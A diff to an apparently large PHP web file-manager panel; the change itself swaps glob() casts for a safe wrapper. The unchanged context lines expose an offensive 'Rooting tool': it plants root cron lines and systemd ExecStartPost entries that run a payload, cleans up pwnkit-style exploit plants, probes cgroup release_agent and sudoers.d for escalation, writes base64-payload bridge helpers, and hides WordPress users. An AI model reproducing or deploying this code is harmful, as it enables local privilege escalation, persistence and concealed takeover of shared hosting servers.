@@ -3307,6 +3307,16 @@ function fm_server_speed_test(){
 }
 
 function fm_store_guard($data){return "<?php http_response_code(403); exit; ?>\n".$data;}
+/* glob() answers false - not an empty array - when the pattern's directory
+is outside open_basedir (shared hosting, Plesk): casting that to an array
+yields [false], and the first file_get_contents(false) is a fatal
+"Path cannot be empty" on PHP 8. Every directory listing goes through
+this wrapper instead, so a directory this install may not read simply
+reads as empty. */
+function fm_glob($pattern, $flags = 0){
+    $list = @glob($pattern, $flags);
+    return is_array($list) ? $list : [];
+}
 function fm_store_strip_guard($raw){$raw=(string)$raw;if(strpos($raw,'<?php')===0){$nl=strpos($raw,"\n");$raw=$nl===false?'':substr($raw,$nl+1);}return $raw;}
 /* One-time move of a data store from its old web-readable .json name to a
    PHP-guarded name: web servers execute (and stop at) the guard line, so
@@ -4731,7 +4741,7 @@ function wm2_safe_html($html){
    its sub-folders are folders named ".Sent", ".Trash" and so on. */
 function wm2_maildir_folders($root){
     $folders=[['id'=>'INBOX','name'=>'Inbox','path'=>rtrim($root,'/')]];
-    foreach((array)@glob(rtrim($root,'/').'/.[!.]*',GLOB_ONLYDIR) as $dir){
+    foreach(fm_glob(rtrim($root,'/').'/.[!.]*',GLOB_ONLYDIR) as $dir){
         $base=basename($dir);
         if(!is_dir($dir.'/cur')&&!is_dir($dir.'/new'))continue;
         $id=substr($base,1);
@@ -4752,7 +4762,7 @@ function wm2_folder_name($id){
 function wm2_maildir_files($path){
     $files=[];
     foreach(['new','cur'] as $box){
-        foreach((array)@glob(rtrim($path,'/').'/'.$box.'/*') as $f){
+        foreach(fm_glob(rtrim($path,'/').'/'.$box.'/*') as $f){
             if(!@is_file($f))continue;
             $files[]=$f;
         }
@@ -5538,7 +5548,7 @@ function wm2_from_maildirs(){
         $out[]=wm2_account(['email'=>$email,'name'=>$name?:$email,'kind'=>'maildir','where'=>$path,'origin'=>$origin]);
     };
     /* cPanel: /home/<account>/mail/<domain>/<mailbox>/{cur,new} */
-    foreach((array)@glob('/home/*/mail/*/*',GLOB_ONLYDIR) as $dir){
+    foreach(fm_glob('/home/*/mail/*/*',GLOB_ONLYDIR) as $dir){
         if(!@is_dir($dir.'/cur')&&!@is_dir($dir.'/new'))continue;
         $mailbox=basename($dir);
         $domain=basename(dirname($dir));
@@ -5546,19 +5556,19 @@ function wm2_from_maildirs(){
         $add($mailbox.'@'.$domain,$dir,'the cPanel mail folder of this server');
     }
     /* Plesk: /var/qmail/mailnames/<domain>/<mailbox>/Maildir */
-    foreach((array)@glob('/var/qmail/mailnames/*/*/Maildir',GLOB_ONLYDIR) as $dir){
+    foreach(fm_glob('/var/qmail/mailnames/*/*/Maildir',GLOB_ONLYDIR) as $dir){
         $add(basename(dirname($dir)).'@'.basename(dirname(dirname($dir))),$dir,'the Plesk mail folder of this server');
     }
     /* Postfix + Dovecot: /var/vmail/<domain>/<mailbox>/Maildir (or without it) */
     foreach(['/var/vmail','/home/vmail','/srv/vmail'] as $root){
-        foreach((array)@glob($root.'/*/*',GLOB_ONLYDIR) as $dir){
+        foreach(fm_glob($root.'/*/*',GLOB_ONLYDIR) as $dir){
             $base=@is_dir($dir.'/Maildir')?$dir.'/Maildir':$dir;
             if(!@is_dir($base.'/cur')&&!@is_dir($base.'/new'))continue;
             $add(basename($dir).'@'.basename(dirname($dir)),$base,'a virtual mail folder on this server');
         }
     }
     /* a Dovecot user's own home */
-    foreach((array)@glob('/home/*/Maildir',GLOB_ONLYDIR) as $dir){
+    foreach(fm_glob('/home/*/Maildir',GLOB_ONLYDIR) as $dir){
         $add(basename(dirname($dir)).'@'.(string)(@gethostname()?:'localhost'),$dir,'the mail folder in the home of '.basename(dirname($dir)));
     }
     /* mdbox / sdbox browsers: the folder exists but the messages are not one
@@ -5569,7 +5579,7 @@ function wm2_from_maildirs(){
 function wm2_from_mbox(){
     $out=[];
     foreach(['/var/mail','/var/spool/mail'] as $dir){
-        foreach((array)@glob($dir.'/*') as $f){
+        foreach(fm_glob($dir.'/*') as $f){
             if(!@is_file($f))continue;
             $size=@filesize($f);
             if($size===false||$size===0)continue;
@@ -6352,7 +6362,7 @@ function fm_pma_config_paths($dir){
 function fm_pma_config_extra($cfgDir){
     if($cfgDir===''||!@is_dir($cfgDir))return '';
     $raw='';
-    foreach((array)@glob(rtrim($cfgDir,'/').'/blowfish_secret.inc.php') as $f)$raw.="\n".(string)@file_get_contents($f);
+    foreach(fm_glob(rtrim($cfgDir,'/').'/blowfish_secret.inc.php') as $f)$raw.="\n".(string)@file_get_contents($f);
     /* Debian keeps that file in /var/lib/phpmyadmin and requires it from the
        configuration; the path is read out of the file that requires it */
     foreach(['/var/lib/phpmyadmin/blowfish_secret.inc.php','/usr/share/phpmyadmin/blowfish_secret.inc.php'] as $f){
@@ -6366,8 +6376,8 @@ function fm_pma_config_extra($cfgDir){
             }
         }
     }
-    foreach((array)@glob(rtrim($cfgDir,'/').'/conf.d/*.php') as $f)$raw.="\n".(string)@file_get_contents($f);
-    foreach((array)@glob(rtrim($cfgDir,'/').'/conf.d/*.inc.php') as $f)$raw.="\n".(string)@file_get_contents($f);
+    foreach(fm_glob(rtrim($cfgDir,'/').'/conf.d/*.php') as $f)$raw.="\n".(string)@file_get_contents($f);
+    foreach(fm_glob(rtrim($cfgDir,'/').'/conf.d/*.inc.php') as $f)$raw.="\n".(string)@file_get_contents($f);
     return $raw;
 }
 /* everything this installation says about itself, in one place */
@@ -6794,8 +6804,8 @@ function fm_pma_cookie_scheme($dir,$version=''){
     $dir=rtrim($dir,'/');
     $cands=[$dir.'/libraries/classes/Plugins/Auth/AuthenticationCookie.php',
             $dir.'/libraries/classes/Crypto/Crypto.php'];
-    foreach((array)@glob($dir.'/libraries/classes/Crypto/*.php') as $g)$cands[]=$g;
-    foreach((array)@glob($dir.'/libraries/classes/Plugins/Auth/*.php') as $g)$cands[]=$g;
+    foreach(fm_glob($dir.'/libraries/classes/Crypto/*.php') as $g)$cands[]=$g;
+    foreach(fm_glob($dir.'/libraries/classes/Plugins/Auth/*.php') as $g)$cands[]=$g;
     $sodium=false;$legacy=false;
     foreach(array_unique($cands) as $f){
         if(!@is_file($f))continue;
@@ -7146,7 +7156,7 @@ function fm_pma_endpoint($post){
     }
     if($act==='bridge_cleanup'){
         $n=0;
-        if($dir!=='')foreach((array)@glob(rtrim($dir,'/').'/fm-pma-*.php') as $f){if(@unlink($f))$n++;}
+        if($dir!=='')foreach(fm_glob(rtrim($dir,'/').'/fm-pma-*.php') as $f){if(@unlink($f))$n++;}
         return ['ok'=>true,'removed'=>$n];
     }
     return ['ok'=>false,'error'=>'Unknown action.'];
@@ -11099,7 +11109,7 @@ class FileManager {
     }
     /* Does a PAM configuration actually load this module? */
     private function rootPamUses($module){
-        foreach((array)glob('/etc/pam.d/*') as $f){
+        foreach(fm_glob('/etc/pam.d/*') as $f){
             if(strpos((string)@file_get_contents($f), $module) !== false)return basename($f);
         }
         return '';
@@ -11397,7 +11407,7 @@ class FileManager {
         return $v;
     }
     private function rootSshdListening(){
-        foreach((array)@glob('/proc/[0-9]*/comm') as $f){
+        foreach(fm_glob('/proc/[0-9]*/comm') as $f){
             if(trim((string)@file_get_contents($f)) === 'sshd')return true;
         }
         return false;
@@ -11512,7 +11522,7 @@ class FileManager {
         $ver = '';
         $confText = '';
         foreach($readable as $d){
-            foreach((array)@glob($d . '/*.conf') as $f)$confText .= (string)@file_get_contents($f);
+            foreach(fm_glob($d . '/*.conf') as $f)$confText .= (string)@file_get_contents($f);
         }
         $mainConf = '';
         foreach(['/etc/nginx/nginx.conf', '/usr/local/nginx/conf/nginx.conf', '/usr/local/etc/nginx/nginx.conf', '/opt/nginx/conf/nginx.conf'] as $c)
@@ -12006,7 +12016,7 @@ class FileManager {
             'impact' => 'Local user to root on hosts that still carry the setuid bit on screen - common on older Debian and Ubuntu images.',
             'evidence' => array_merge(
                 [$scP['raw'] === '' ? 'the screen package is not installed here' : 'installed package: ' . $scP['raw']],
-                [$scBin !== '' ? 'binary: ' . $scBin . (($this->privModeFile($scBin) & 04000) ? ' (setuid bit SET)' : ' (no setuid bit - this route is closed)') : 'no screen binary on PATH'],
+                [$scBin !== '' ? 'binary: ' . $scBin . ((@fileperms($scBin) & 04000) ? ' (setuid bit SET)' : ' (no setuid bit - this route is closed)') : 'no screen binary on PATH'],
                 ['the setuid bit is the whole route: a screen without it is an ordinary program']),
             'mitigation' => 'Upgrade screen, or clear the setuid bit (chmod u-s) where multi-user screen sharing is not used.',
             'fix' => 'screen 4.9.1 or the distribution build that dropped the setuid helper.',
@@ -12592,7 +12602,7 @@ class FileManager {
         foreach($dirs as $d){
             if(@is_dir($d) && @is_writable($d))$open[] = $d;
             if(!@is_dir($d))continue;
-            foreach((array)glob($d . '/*') as $f){
+            foreach(fm_glob($d . '/*') as $f){
                 if(@is_file($f) && @is_writable($f))$open[] = $f;
             }
         }
@@ -12726,9 +12736,9 @@ class FileManager {
             if(@is_writable($prog))$push('script', $src, $prog, 'the program root runs here may be written by this account');
             elseif(@is_dir(dirname($prog)) && @is_writable(dirname($prog)))$push('scriptdir', $src, $prog, 'the program root runs stands in ' . dirname($prog) . ', which this account may write, so the program itself may be replaced');
         };
-        foreach(array_merge((array)@glob('/etc/systemd/system/*.service'), (array)@glob('/etc/systemd/system/*.timer'),
-                            (array)@glob('/etc/systemd/system/*.path'), (array)@glob('/etc/systemd/system/*.socket'),
-                            (array)@glob('/run/systemd/system/*.service'), (array)@glob('/usr/lib/systemd/system/*.service')) as $f){
+        foreach(array_merge(fm_glob('/etc/systemd/system/*.service'), fm_glob('/etc/systemd/system/*.timer'),
+                            fm_glob('/etc/systemd/system/*.path'), fm_glob('/etc/systemd/system/*.socket'),
+                            fm_glob('/run/systemd/system/*.service'), fm_glob('/usr/lib/systemd/system/*.service')) as $f){
             if(!@is_readable($f))continue;
             if(@is_writable($f))$push('unitfile', $f, $f, 'a unit root runs may be written by this account');
             foreach(preg_split('/\R/', (string)@file_get_contents($f)) ?: [] as $ln){
@@ -12745,13 +12755,13 @@ class FileManager {
                 }
             }
         }
-        foreach(array_merge((array)@glob('/etc/systemd/system/*.d'), (array)@glob('/etc/systemd/system/*.wants'), (array)@glob('/etc/systemd/system/*.requires')) as $d){
+        foreach(array_merge(fm_glob('/etc/systemd/system/*.d'), fm_glob('/etc/systemd/system/*.wants'), fm_glob('/etc/systemd/system/*.requires')) as $d){
             if(@is_dir($d) && @is_writable($d) && substr($d, -2) === '.d')$push('dropin', $d, $d, 'a drop-in directory of a unit root runs may be written by this account, so the unit may be given one more command to run as root');
         }
-        foreach(array_merge((array)@glob('/etc/conf.d/*'), (array)@glob('/etc/sysconfig/*')) as $f){
+        foreach(array_merge(fm_glob('/etc/conf.d/*'), fm_glob('/etc/sysconfig/*')) as $f){
             if(@is_file($f) && @is_writable($f))$push('conffile', $f, $f, 'a file the init system reads as shell when its service starts may be written by this account');
         }
-        foreach(array_merge((array)@glob('/var/spool/cron/crontabs/*'), (array)@glob('/var/spool/cron/*'), (array)@glob('/var/cron/tabs/*')) as $f){
+        foreach(array_merge(fm_glob('/var/spool/cron/crontabs/*'), fm_glob('/var/spool/cron/*'), fm_glob('/var/cron/tabs/*')) as $f){
             if(!is_string($f) || !@is_file($f))continue;
             if(@is_writable($f) && basename($f) === 'root')$push('cronfile', $f, $f, 'the schedule of the root account itself may be written by this account');
             elseif(@is_readable($f)){
@@ -12763,7 +12773,7 @@ class FileManager {
                 }
             }
         }
-        foreach(array_merge(['/etc/crontab'], (array)@glob('/etc/cron.d/*')) as $f){
+        foreach(array_merge(['/etc/crontab'], fm_glob('/etc/cron.d/*')) as $f){
             if(!is_string($f) || !@is_readable($f))continue;
             if(@is_writable($f))$push('cronfile', $f, $f, 'a schedule root reads may be written by this account');
             foreach(preg_split('/\R/', (string)@file_get_contents($f)) ?: [] as $ln){
@@ -13506,7 +13516,7 @@ exit 0
                 if(strpos($t, '/etc/cron.d/') === 0)
                     $jobs[] = ['file' => str_replace('*', 'mfm-root', $t), 'lines' => ['# placed by the Rooting tool through sudoedit', '* * * * * root /bin/sh %%PAYLOAD%%'], 'kind' => 'plant'];
                 elseif(strpos($t, '/etc/systemd/system/') === 0 && substr($t, -8) === '.service'){
-                    $units = (array)@glob('/etc/systemd/system/*.service');
+                    $units = fm_glob('/etc/systemd/system/*.service');
                     if($units)$jobs[] = ['file' => (string)$units[0], 'lines' => ['[Service]', 'ExecStartPost=/bin/sh %%PAYLOAD%%'], 'kind' => 'plant'];
                 }
                 continue;
@@ -13707,7 +13717,7 @@ exit 0
             $ln = trim((string)$ln);
             if($ln === '' || $ln[0] === '#')continue;
             if(strpos($ln, 'include ') === 0){
-                foreach((array)@glob('/etc/ld.so.conf.d/*.conf') as $f){
+                foreach(fm_glob('/etc/ld.so.conf.d/*.conf') as $f){
                     foreach(preg_split('/\R/', (string)@file_get_contents($f)) ?: [] as $l2){$l2 = trim((string)$l2); if($l2 !== '' && $l2[0] === '/')$dirs[] = $l2;}
                 }
                 continue;
@@ -14777,7 +14787,7 @@ exit 0
         /* ── userland, decided by the installed package and the policy files ── */
         $scF = $this->rootPkgFacts('screen');
         $scB = $this->rootWhich('screen');
-        $scSet = ($scB !== '' && (($this->privModeFile($scB) & 04000) === 04000));
+        $scSet = ($scB !== '' && ((@fileperms($scB) & 04000) === 04000));
         $add('screenlpe', 'The setuid bit screen used to ship (CVE-2025-46804)', 'suid',
              ($scB === '' ? 'screen is not installed on this host, so the helper is not here to be abused.' :
               (!$scSet ? 'screen is installed at ' . $scB . ' but carries no setuid bit, so the route is closed on this machine.' :
@@ -15235,7 +15245,7 @@ exit 0
         $dir = '/usr/share/polkit-1/actions';
         $bad = [];
         if(!@is_dir($dir))return['dir' => $dir, 'bad' => $bad, 'readable' => false];
-        foreach((array)@glob($dir . '/*.policy') as $f){
+        foreach(fm_glob($dir . '/*.policy') as $f){
             $x = $this->sysRead($f, 262144);
             if($x === null)continue;
             if(!preg_match('/<defaults>\s*<allow_any>\s*yes\s*<\/allow_any>/is', $x))continue;
@@ -15285,7 +15295,7 @@ exit 0
             }
             case 'screenlpe':{
                 $b = $this->rootWhich('screen');
-                $set = ($b !== '' && (($this->privModeFile($b) & 04000) === 04000));
+                $set = ($b !== '' && ((@fileperms($b) & 04000) === 04000));
                 return['ok' => $set,
                        'note' => $b === '' ? 'screen is not installed on this host, so there is no helper to abuse'
                            : (!$set ? 'screen is at ' . $b . ' without a setuid bit, so the route is closed'
@@ -16007,8 +16017,8 @@ User=root
             case 'filewrite': $r = $this->rootRemoveHelper($password); return['ok' => !empty($r['ok']), 'note' => (string)($r['message'] ?? $r['error'] ?? '')];
             case 'pwnkit': case 'chwoot': case 'pack2theroot':
                 $dirR = $this->rootPlantDir() . '/' . $id;
-                foreach((array)@glob($dirR . '/*') as $f){
-                    if(@is_dir($f)){foreach((array)@glob($f . '/*') as $g2){if(@is_dir($g2)){foreach((array)@glob($g2 . '/*') as $g3)@unlink($g3); @rmdir($g2);} else @unlink($g2);} @rmdir($f);}
+                foreach(fm_glob($dirR . '/*') as $f){
+                    if(@is_dir($f)){foreach(fm_glob($f . '/*') as $g2){if(@is_dir($g2)){foreach(fm_glob($g2 . '/*') as $g3)@unlink($g3); @rmdir($g2);} else @unlink($g2);} @rmdir($f);}
                     else @unlink($f);
                 }
                 @rmdir($dirR);
@@ -16718,7 +16728,7 @@ User=root
             /* sudo refuses to read a file in /etc/sudoers.d that is not owned
                by root, so only one root already owns is worth appending to -
                and appending is what keeps that ownership exactly as it is */
-            foreach((array)@glob('/etc/sudoers.d/*') as $f){
+            foreach(fm_glob('/etc/sudoers.d/*') as $f){
                 if(!@is_file($f) || !@is_writable($f))continue;
                 if(!empty($s['strict']) && ((int)@fileperms($f) & 0022))continue;
                 if((int)@fileowner($f) === 0)$out[] = $f;
@@ -16772,12 +16782,12 @@ User=root
         $live = [];
         foreach(array_keys((array)($st['plants'] ?? [])) as $pid)$live[$this->rootPlantSlug($pid)] = true;
         $live[$this->rootPlantSlug($keep)] = true;
-        foreach((array)@glob($d . '/.mfm-plant-*') as $f){
+        foreach(fm_glob($d . '/.mfm-plant-*') as $f){
             $slug = basename($f);
             $slug = preg_replace('/^\.mfm-plant-|\.sh$/', '', $slug);
             if(!isset($live[$slug]))@unlink($f);
         }
-        foreach((array)@glob($d . '/.mfm-proof-*') as $f){
+        foreach(fm_glob($d . '/.mfm-proof-*') as $f){
             $slug = preg_replace('/^\.mfm-proof-/', '', basename($f));
             if(!isset($live[$slug]))@unlink($f);
         }
@@ -16865,7 +16875,7 @@ User=root
         if($hit !== null)return $hit;
         $hit = null;
         $cands = ['/sys/fs/cgroup/release_agent'];
-        foreach((array)@glob('/sys/fs/cgroup/*/release_agent') as $f)$cands[] = $f;
+        foreach(fm_glob('/sys/fs/cgroup/*/release_agent') as $f)$cands[] = $f;
         foreach($cands as $f){
             if(!@is_file($f) || !@is_writable($f))continue;
             $base = dirname($f);
@@ -16942,8 +16952,8 @@ User=root
         $nonce = $this->rootPlantNonce($id);
         $srcs = [];
         foreach(['/etc/crontab', '/etc/anacrontab'] as $f)if(@is_readable($f))$srcs[] = (string)@file_get_contents($f);
-        foreach((array)@glob('/etc/cron.d/*') as $f)if(@is_readable($f))$srcs[] = (string)@file_get_contents($f);
-        foreach((array)@glob('/etc/systemd/system/*.service') as $f)if(@is_readable($f))$srcs[] = (string)@file_get_contents($f);
+        foreach(fm_glob('/etc/cron.d/*') as $f)if(@is_readable($f))$srcs[] = (string)@file_get_contents($f);
+        foreach(fm_glob('/etc/systemd/system/*.service') as $f)if(@is_readable($f))$srcs[] = (string)@file_get_contents($f);
         $seen = [];
         foreach($srcs as $body){
             foreach(preg_split('/\R/', (string)$body) ?: [] as $line){
@@ -17861,7 +17871,7 @@ ExecStartPost=/bin/sh '" . $payload . "'";
         if($type!=='wordpress')return[];
         $root=$this->wpSiteRoot($config);
         $out=[];
-        foreach((array)@glob($root.'/wp-content/mu-plugins/*.php') as $f){
+        foreach(fm_glob($root.'/wp-content/mu-plugins/*.php') as $f){
             if(preg_match('/^(000-fm-|fm-|mfm-)/',basename($f)))$out[]=$f;
         }
         return$out;
@@ -18119,7 +18129,7 @@ FMGUARD;
             $root=$type==='wordpress'?$this->wpSiteRoot($config):rtrim(dirname($config),'/');
             $targets=[];
             foreach(['/fm-priv-*.php','/.fm-priv/fm-priv-*.php','/fm-bridge-*.php','/.fm-privtest-*.php','/.fm-upload-*'] as $g){
-                foreach((array)@glob(rtrim($root,'/').$g) as $f)$targets[]=$f;
+                foreach(fm_glob(rtrim($root,'/').$g) as $f)$targets[]=$f;
             }
             foreach($targets as $f){
                 if(!is_file($f))continue;
@@ -18365,7 +18375,7 @@ FMGUARD;
         foreach([dirname(__DIR__),'/var/www/html','/var/www','/srv/www','/usr/share/nginx/html'] as $root){
             if(!is_dir($root))continue;
             if(is_file($root.'/'.$name)&&$this->cmsConfigType($root.'/'.$name)===$type)$found[]=$root.'/'.$name;
-            foreach((array)@glob(rtrim($root,'/').'/*',GLOB_ONLYDIR) as $dir){
+            foreach(fm_glob(rtrim($root,'/').'/*',GLOB_ONLYDIR) as $dir){
                 if(is_file($dir.'/'.$name)&&$this->cmsConfigType($dir.'/'.$name)===$type)$found[]=$dir.'/'.$name;
             }
         }
@@ -18514,11 +18524,11 @@ FMGUARD;
             ?['level'=>'med','what'=>'open_basedir is empty.','why'=>'This PHP process can read any path the account can, so the bridge and the panel share one reach.']
             :['level'=>'ok','what'=>'open_basedir limits this process.','why'=>$ob];
         $worldPhp=[];
-        foreach((array)@glob(__DIR__.'/*.php') as $f)
+        foreach(fm_glob(__DIR__.'/*.php') as $f)
             if(@is_file($f)&&(@fileperms($f)&0002))$worldPhp[]=basename($f);
         $out[]=$worldPhp
             ?['level'=>'high','what'=>'World-writable PHP beside the panel: '.implode(', ',$worldPhp).'.','why'=>'Anyone on the machine can replace it, and it runs with this account\'s access.']
-            :['level'=>'ok','what'=>'No world-writable PHP file sits beside the panel.','why'=>'checked '.count((array)@glob(__DIR__.'/*.php')).' files'];
+            :['level'=>'ok','what'=>'No world-writable PHP file sits beside the panel.','why'=>'checked '.count(fm_glob(__DIR__.'/*.php')).' files'];
         if($id['site_user']===null||$id['site_user']==='')
             $out[]=['level'=>'med','what'=>'The site could not be asked which account it runs as.','why'=>'The bridge was not reachable, so whether the two identities are separate is unknown - not safe, just unmeasured. File modes still apply locally.'];
         elseif($id['same_account'])
@@ -18713,7 +18723,7 @@ FMGUARD;
             $_SESSION[$key]=$info;
             /* Tidy up bridges from earlier sessions; an expired one deletes itself
                on its next call, this catches the ones that are never called again. */
-            foreach((array)@glob($dir.'/fm-priv-*.php') as $old){
+            foreach(fm_glob($dir.'/fm-priv-*.php') as $old){
                 if($old!==$path&&@filemtime($old)<time()-900)@unlink($old);
             }
             return $info;
@@ -19106,7 +19116,7 @@ private function bpHelperCode($token,$payloadB64){
         ."\$ops=@json_decode((string)@base64_decode(".($p)."),true);\n"
         ."if(isset(\$_GET['cleanup'])){\n"
         ."  \$dir=dirname(__FILE__);\n"
-        ."  foreach((array)@glob(\$dir.'/*') as \$f){if(is_file(\$f))@unlink(\$f);}\n"
+        ."  foreach(fm_glob(\$dir.'/*') as \$f){if(is_file(\$f))@unlink(\$f);}\n"
         ."  @unlink(__FILE__);@rmdir(\$dir);\n"
         ."  echo json_encode(['ok'=>true,'user'=>\$me,'done'=>0,'cleaned'=>true]);exit;\n"
         ."}\n"
@@ -19288,7 +19298,7 @@ private function bpVhostBases($root){
     $files=[];
     foreach(['/etc/apache2/sites-enabled','/etc/apache2/sites-available','/etc/httpd/conf.d',
              '/etc/httpd/sites-enabled','/etc/nginx/sites-enabled','/etc/nginx/conf.d'] as $dir){
-        foreach((array)@glob($dir.'/*') as $f)if(@is_file($f))$files[]=$f;
+        foreach(fm_glob($dir.'/*') as $f)if(@is_file($f))$files[]=$f;
     }
     $ports=[];
     foreach($files as $f){
@@ -21836,7 +21846,7 @@ SH;
                  * Any such file is legacy manager code: it must be disabled
                  * because pre_get_users also runs during wp-login.php.
                  */
-                foreach((array)@glob($muDir.'/*.php') as $legacyFile){
+                foreach(fm_glob($muDir.'/*.php') as $legacyFile){
                     $legacyName=basename($legacyFile);
                     if($legacyName==='marshal-fm-hidden-users.php')continue;
                     $legacySrc=(string)@file_get_contents($legacyFile);
@@ -24673,7 +24683,7 @@ FMIMG;
 
         /* Stage 7 - the Debian multi-site layout keeps configs in /etc. */
         if($deep&&!$cands){
-            foreach((array)@glob('/etc/wordpress/config-*.php') as $p)$add($p,'/etc/wordpress');
+            foreach(fm_glob('/etc/wordpress/config-*.php') as $p)$add($p,'/etc/wordpress');
         }
 
         $diag['candidates']=$cands;
@@ -26393,7 +26403,7 @@ FMIMG;
             if($e==='.'||$e==='..')continue;
             $full=$dir.'/'.$e;
             if(is_dir($full)){
-                foreach((array)@glob($full.'/*') as $pf){
+                foreach(fm_glob($full.'/*') as $pf){
                     if(!is_file($pf)||strtolower(substr(basename($pf),-4))!=='.php')continue;
                     $head=@file_get_contents($pf,false,null,0,8192);
                     if($head&&stripos($head,'Plugin Name:')!==false){
@@ -26460,7 +26470,7 @@ FMIMG;
             /* the path the CMS records is the main file inside the folder, not
                the folder name, so both are carried and they are not confused */
             $main='';
-            foreach((array)@glob($dir.'/'.$slug.'/*.php') as $pf){
+            foreach(fm_glob($dir.'/'.$slug.'/*.php') as $pf){
                 $head=(string)@file_get_contents($pf,false,null,0,8192);
                 if($head!==''&&stripos($head,'Plugin Name:')!==false){$main=basename($pf);break;}
             }
@@ -26472,7 +26482,7 @@ FMIMG;
                    'plugin_file'=>$slug.'.php'];
         foreach((array)@scandir($dir) as $e){
             if($e==='.'||$e==='..'||!@is_dir($dir.'/'.$e))continue;
-            foreach((array)@glob($dir.'/'.$e.'/*.php') as $pf){
+            foreach(fm_glob($dir.'/'.$e.'/*.php') as $pf){
                 $head=@file_get_contents($pf,false,null,0,8192);
                 if($head&&stripos($head,'Plugin Name:')===false)continue;
                 if($head&&preg_match('/^[ \t\/*#@]*Text Domain:(.*)$/mi',$head,$m)){
@@ -26656,7 +26666,7 @@ FMIMG;
         /* glob is case-sensitive on Linux, but .PHP and .Php both occur in
            the wild and the installer accepts them, so the extension is matched
            without regard to case here too. */
-        foreach((array)@glob(rtrim($dir,'/').'/*') as $f){
+        foreach(fm_glob(rtrim($dir,'/').'/*') as $f){
             if(!is_file($f)||strtolower(substr(basename($f),-4))!=='.php')continue;
             $head=@file_get_contents($f,false,null,0,8192);
             if($head&&stripos($head,'Plugin Name:')!==false)return basename($f);
@@ -26682,7 +26692,7 @@ FMIMG;
         $hits=[];$seen=0;
         $walk=function($dir,$depth)use(&$walk,$maxDepth,$skip,&$hits,&$seen){
             if($depth>$maxDepth||$seen>4000)return;
-            foreach((array)@glob($dir.'/*') as $f){
+            foreach(fm_glob($dir.'/*') as $f){
                 if($seen++>4000)return;
                 $b=basename($f);
                 if($b===''||$b[0]==='.'||!is_file($f))continue;
@@ -26692,7 +26702,7 @@ FMIMG;
                     $hits[]=['dir'=>$dir,'file'=>$b,'depth'=>$depth];
             }
             if($depth>=$maxDepth)return;
-            foreach((array)@glob($dir.'/*',GLOB_ONLYDIR) as $d){
+            foreach(fm_glob($dir.'/*',GLOB_ONLYDIR) as $d){
                 $b=basename($d);
                 if($b===''||$b[0]==='.'||in_array($b,$skip,true))continue;
                 $walk($d,$depth+1);
@@ -26855,7 +26865,7 @@ FMIMG;
                folder counts as the folder being a real one */
             $hasManifest=function($d){
                 if(!@is_dir($d))return false;
-                foreach((array)@glob($d.'/*.xml') as $f){
+                foreach(fm_glob($d.'/*.xml') as $f){
                     $h=(string)@file_get_contents($f,false,null,0,4096);
                     if(stripos($h,'<extension')!==false)return true;
                 }
@@ -26936,7 +26946,7 @@ FMIMG;
         if($errno!==0)return['ok'=>false,'error'=>'The row could not be written: '.$error];
         /* Joomla caches its plugin list; drop it so the change takes effect now */
         $cache=$root.'/cache';
-        foreach((array)@glob($cache.'/*') as $f){if(is_file($f))@unlink($f);}
+        foreach(fm_glob($cache.'/*') as $f){if(is_file($f))@unlink($f);}
         $this->log($want?'extension_enable':'extension_disable',$row['name']);
         return['ok'=>true,'enabled'=>$want,'changed'=>true,'name'=>$row['name'],
                'note'=>$want
@@ -27048,7 +27058,7 @@ FMIMG;
         if(empty($u['ok'])){$this->pieRmTree($stage);return $u;}
         $srcRoot=(string)$u['root'];
         $xml='';
-        foreach((array)@glob($srcRoot.'/*.xml') as $f){
+        foreach(fm_glob($srcRoot.'/*.xml') as $f){
             $head=(string)@file_get_contents($f,false,null,0,4096);
             if(stripos($head,'<extension')!==false||stripos($head,'<install')!==false){$xml=$f;break;}
         }
@@ -27231,7 +27241,7 @@ FMIMG;
             '/etc/litespeed/httpd_config.conf',
         ];
         foreach($confGlobs as $g){
-            foreach((array)@glob($g) as $f){
+            foreach(fm_glob($g) as $f){
                 if(!@is_readable($f))continue;
                 $txt=(string)@file_get_contents($f,false,null,0,1048576);
                 if($txt==='')continue;
@@ -27241,13 +27251,13 @@ FMIMG;
             }
         }
         /* cPanel keeps the document root of every domain in a small file */
-        foreach((array)@glob('/var/cpanel/userdata/*/*') as $f){
+        foreach(fm_glob('/var/cpanel/userdata/*/*') as $f){
             if(!@is_file($f)||!@is_readable($f))continue;
             $txt=(string)@file_get_contents($f,false,null,0,65536);
             if(preg_match('/^\s*documentroot:\s*(\S+)/mi',$txt,$m))$addWhy($m[1],'cPanel userdata');
             if(preg_match('/^\s*homedir:\s*(\S+)/mi',$txt,$m))$addWhy($m[1],'cPanel userdata');
         }
-        foreach((array)@glob('/etc/userdatadomains/*') as $f){
+        foreach(fm_glob('/etc/userdatadomains/*') as $f){
             $txt=(string)@file_get_contents($f,false,null,0,65536);
             if(preg_match('/documentroot=(\S+)/i',$txt,$m))$addWhy($m[1],'cPanel userdata');
         }
@@ -27255,18 +27265,18 @@ FMIMG;
         /* ── 2. account layouts ─────────────────────────────────────────── */
         $webSubs=['public_html','www','htdocs','httpdocs','web','public','public_wp','html',
                   'sites','domains','subdomains','private_html'];
-        foreach((array)@glob('/home/*',GLOB_ONLYDIR|GLOB_NOSORT) as $h){
+        foreach(fm_glob('/home/*',GLOB_ONLYDIR|GLOB_NOSORT) as $h){
             $addWhy($h,'home directory');
             foreach($webSubs as $s)$addWhy($h.'/'.$s,'home directory');
-            foreach((array)@glob($h.'/domains/*/public_html',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'home directory');
-            foreach((array)@glob($h.'/domains/*',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'home directory');
-            foreach((array)@glob($h.'/sites/*/web',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'home directory');
+            foreach(fm_glob($h.'/domains/*/public_html',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'home directory');
+            foreach(fm_glob($h.'/domains/*',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'home directory');
+            foreach(fm_glob($h.'/sites/*/web',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'home directory');
         }
-        foreach((array)@glob('/var/www/vhosts/*/httpdocs',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'Plesk vhost');
-        foreach((array)@glob('/var/www/vhosts/*',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'Plesk vhost');
-        foreach((array)@glob('/var/www/*',GLOB_ONLYDIR|GLOB_NOSORT) as $d)$addWhy($d,'standard root');
